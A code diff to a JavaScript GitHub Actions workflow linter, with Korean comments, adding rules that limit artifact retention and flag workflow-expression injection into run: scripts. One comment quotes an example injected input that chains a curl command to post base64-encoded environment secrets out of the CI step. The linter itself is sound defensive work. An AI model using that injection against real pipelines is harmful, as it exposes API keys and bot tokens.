@@ -1,3 +1,10 @@
+/**
+ * 아티팩트 보관 상한(ADR-020 최종 리뷰 SF-1). 템플릿은 7일을 쓰고, 규칙은 14일까지 받는다 —
+ * 사후 조사에 필요한 창(사람이 다음 근무일에 들여다보는 시간)은 남기되, 90일 기본값으로는
+ * 되돌아갈 수 없게 한다.
+ */
+const RETENTION_MAX_DAYS = 14;
+
 /** ADR-009 규칙을 텍스트 수준에서 검사한다. YAML 파서 없이 — 의존성 추가 금지. */
 export function lintWorkflow(text) {
   const out = [];
@@ -28,6 +35,19 @@ export function lintWorkflow(text) {
     const hidden = block.some((b) => /(^|\s|\|)\.[\w-]+\//.test(b.replace(/#.*/, "")) && !/include-hidden-files/.test(b));
     const has = block.some((b) => /include-hidden-files:\s*true/.test(b));
     if (hidden && !has) out.push({ line: i + 1, rule: "hidden-artifact", msg: "upload-artifact with a dot-directory path needs include-hidden-files: true" });
+    // 2b) ADR-020 최종 리뷰 SF-1 — **보관 기간은 명시적이어야 하고 짧아야 한다.** 이 업로드에는
+    // `claude -p` 트랜스크립트와 `.factory/out/`이 통째로 들어가고, 그 트리에는 `actions/checkout`이
+    // 심은 `.git/config`의 basic-auth 헤더가 함께 있다(`persist-credentials`는 락 push 때문에 끌 수
+    // 없다 — ADR-020의 알려진 한계). 공개 저장소에서 아티팩트는 **레포 read 권한자 누구나** 받는다.
+    // `retention-days`가 없으면 기본은 **90일**이고, 그 숫자는 파일 어디에도 쓰여 있지 않아 아무도
+    // 그것을 결정으로 읽지 않는다. 업로드 직전의 스크럽(`scrub-artifacts.js`)이 1차 방어라면 이 값은
+    // 2차다: 스크럽이 놓친 모양이 있어도 노출 창이 7일로 닫힌다. 값을 **읽을 수 없으면**(표현식)
+    // 통과시키지 않는다 — `${{ vars.X }}`가 비어 있으면 조용히 90일로 돌아간다.
+    const retentionLine = block.map((b) => /^\s*retention-days:\s*(.+?)\s*$/.exec(b.replace(/^([^#]*?)\s+#.*$/, "$1"))).find(Boolean);
+    const days = retentionLine ? Number(retentionLine[1]) : null;
+    if (days == null || !Number.isInteger(days) || days < 1 || days > RETENTION_MAX_DAYS) {
+      out.push({ line: i + 1, rule: "artifact-retention", msg: `every actions/upload-artifact step needs an explicit \`retention-days:\` of 1–${RETENTION_MAX_DAYS} (the factory templates use 7) — the default is 90 days, and these artifacts carry the session transcript and the checkout tree whose \`.git/config\` holds the bot token's basic-auth header, downloadable by anyone with repo read (ADR-020 final review SF-1)` });
+    }
     // 3) `~`는 **셸 확장**이지 glob이 아니다. upload-artifact는 경로를 셸에 넘기지 않고 그대로 glob으로
     // 쓰므로 `~/.claude/projects/**/*.jsonl`은 아무것도 맞히지 못한다 — `if-no-files-found: ignore`까지
     // 붙어 있으면 **실패조차 하지 않고** 빈 아티팩트가 올라간다(KTB-7 재리뷰: 트랜스크립트가 산출물
@@ -48,17 +68,67 @@ export function lintWorkflow(text) {
       }
     });
   }
+  out.push(...lintExpressionsInRun(lines));
   const stage = STAGE_RUN.exec(text);
   if (stage) out.push(...lintStageWorkflow(text, lines, stage[1]));
   return out;
 }
 
 /**
- * ADR-020 KTB-24/KTB-26 — 스테이지 워크플로에만 거는 세 규칙. "이 텍스트가 스테이지 워크플로다"의
- * 표식은 `run-stage.js <stage> <issue>`를 **정리 플래그 없이** 실행하는 줄 하나다: 그래야 설정 조각·
- * composite action·정리 스텝만 있는 스니펫이 규칙에 걸리지 않는다(`lintWorkflow`는 파일 이름을 받지 않는다).
+ * ADR-020 최종 리뷰 MF-2 — **공격자가 고를 수 있는 텍스트는 `run:` 안에 들어가지 않는다.**
+ *
+ * `${{ … }}`는 셸이 보기 **전에** Actions가 텍스트로 치환한다. 그래서 `run: node x.js ${{ inputs.issue }}`는
+ * 인자 전달이 아니라 **코드 합성**이다: `inputs.issue`는 자유 문자열(`type: string`)이고, `gh workflow run`을
+ * 부를 수 있는 사람(= 레포 write, 또는 유출된 CI 토큰, 또는 봇 토큰 자신)이 `1; curl -sd "$(env|base64 -w0)" …`을
+ * 넣으면 그 스텝의 env에 실린 CLAUDE_CODE_OAUTH_TOKEN·ANTHROPIC_API_KEY·FACTORY_BOT_TOKEN이 그대로 나간다.
+ * GitHub이 일부러 갈라 둔 경계(write ≠ secret read)가 한 줄로 무너진다. KTB-8이 workflow_dispatch를
+ * **재점화의 주 손잡이**로 만든 뒤라 이 싱크는 예외 경로가 아니라 본선 위에 있었다.
+ *
+ * 고침은 기계적이다(스텝 `env:`로 묶고 `"$VAR"`로 읽는다) — 그래서 규칙으로 고정한다. 사람이 나중에
+ * 한 줄을 "간단하게" 되돌리는 것이 바로 이 결함이 생긴 방식이다.
+ *
+ * 보는 범위는 `${{ inputs.` 와 `${{ github.event.` 둘뿐이다. `github.sha`·`job.status`·`github.run_id`·
+ * `secrets.*`는 공격자가 고를 수 없는 값이라(GitHub이 만든다) 같은 종류의 위험이 아니다 —
+ * 규칙을 넓히면 정당한 자리까지 잡아 규칙 자체가 꺼진다.
+ *
+ * `run:` 블록 안의 `#` 줄도 **벗기지 않는다**: 셸 주석이어도 Actions의 치환은 그보다 먼저 일어나므로
+ * 주석 안의 `${{ … }}`도 똑같이 확장된다(다만 셸이 실행하지 않을 뿐이다 — 그리고 그 텍스트가 줄바꿈을
+ * 품으면 다음 줄은 실행된다).
  */
-const STAGE_RUN = /run:\s*node \.factory\/bin\/run-stage\.js\s+(triage|plan|implement|review|merge)\b(?![^\n]*--aborted)/;
+const RUN_EXPRESSION = /\$\{\{\s*(inputs\.|github\.event\.)/;
+function lintExpressionsInRun(lines) {
+  const out = [];
+  const flag = (i, text) => {
+    if (RUN_EXPRESSION.test(text)) out.push({ line: i + 1, rule: "no-expression-in-run", msg: "never interpolate ${{ inputs.* }} or ${{ github.event.* }} into a `run:` script — bind it in the step's `env:` (ISSUE: ${{ … }}) and read \"$ISSUE\", validated as ^[0-9]+$. The expression is substituted as text before the shell parses the line, so a free-form input becomes code in a step that holds every secret (ADR-020 final review MF-2)" });
+  };
+  for (let i = 0; i < lines.length; i++) {
+    const m = /^(\s*)(?:-\s+)?run:(.*)$/.exec(lines[i]);
+    if (!m) continue;
+    const rest = m[2].trim();
+    // 한 줄짜리 `run: …`은 그 줄이 곧 스크립트다. `run: |`·`run: >`(및 `|-`/`>-` 등)와 값이 빈 형태는
+    // 블록 스칼라 — 더 깊이 들여쓴 줄들이 본문이다.
+    if (rest !== "" && !/^[|>][-+0-9]*$/.test(rest)) { flag(i, rest); continue; }
+    const indent = lines[i].search(/\S/);
+    for (let j = i + 1; j < lines.length; j++) {
+      if (lines[j].trim() === "") continue;
+      if (lines[j].search(/\S/) <= indent) break;
+      flag(j, lines[j]);
+    }
+  }
+  return out;
+}
+
+/**
+ * ADR-020 KTB-24/KTB-26 — 스테이지 워크플로에만 거는 세 규칙. "이 텍스트가 스테이지 워크플로다"의
+ * 표식은 `run-stage.js <stage> "$ISSUE"`를 **정리 플래그 없이** 실행하는 줄 하나다: 그래야 설정 조각·
+ * composite action·정리 스텝만 있는 스니펫이 규칙에 걸리지 않는다(`lintWorkflow`는 파일 이름을 받지 않는다).
+ *
+ * 최종 리뷰 MF-2 이후 이슈 번호는 스텝 `env:`의 `ISSUE`로만 들어온다 — 그래서 이 표식이 곧 "MF-2의
+ * 모양을 지켰는가"이기도 하다. 옛 모양(`… ${{ github.event.issue.number || inputs.issue }}`)으로
+ * 되돌리면 이 정규식이 빗나가 **스테이지 규칙 네 개가 통째로 조용해진다** — 그 침묵이 곧 회귀 신호다
+ * (`no-expression-in-run`이 같은 줄을 따로 잡으므로 파일이 조용히 통과하지는 않는다).
+ */
+const STAGE_RUN = /node \.factory\/bin\/run-stage\.js\s+(triage|plan|implement|review|merge)\s+"\$ISSUE"(?![^\n]*--aborted)/;
 
 /**
  * KTB-24 — review·implement의 `timeout-minutes` 하한. 데모 #15의 review는 4역할 × +709줄 PR을
